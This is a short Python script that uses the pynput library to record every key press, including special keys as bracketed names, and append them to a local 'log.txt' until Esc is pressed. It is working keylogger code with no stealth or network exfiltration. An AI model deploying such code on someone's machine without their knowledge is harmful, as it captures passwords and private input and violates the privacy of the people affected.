from pynput import keyboard

LOG_FILE = "log.txt"
BUFFER_SIZE = 10
buffer = []

# Mapping for special keys to readable representations
SPECIAL_KEYS = {
    keyboard.Key.space: " ",
    keyboard.Key.enter: "\n",
    keyboard.Key.tab: "\t",
    keyboard.Key.backspace: "[BACKSPACE]",
}

# Keys to silently ignore (modifiers)
IGNORED_KEYS = {
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.alt_l,
    keyboard.Key.alt_r,
    keyboard.Key.alt_gr,
    keyboard.Key.caps_lock,
    keyboard.Key.cmd,
    keyboard.Key.cmd_r,
}


def flush_buffer():
    """Write buffered keystrokes to disk and clear the buffer."""
    if buffer:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write("".join(buffer))
        buffer.clear()


def on_press(key):
    """Handle a key press event."""
    try:
        # Escape key stops the listener
        if key == keyboard.Key.esc:
            flush_buffer()
            return False

        # Ignore modifier keys
        if key in IGNORED_KEYS:
            return

        # Check for mapped special keys
        if key in SPECIAL_KEYS:
            buffer.append(SPECIAL_KEYS[key])
        elif hasattr(key, "char") and key.char is not None:
            buffer.append(key.char)
        else:
            # Log unmapped special keys in bracket notation
            buffer.append(f"[{key.name.upper()}]")

        # Flush when the buffer is full
        if len(buffer) >= BUFFER_SIZE:
            flush_buffer()

    except Exception:
        # Prevent callback-thread crashes
        pass


if __name__ == "__main__":
    try:
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()
    except KeyboardInterrupt:
        pass
    finally:
        flush_buffer()
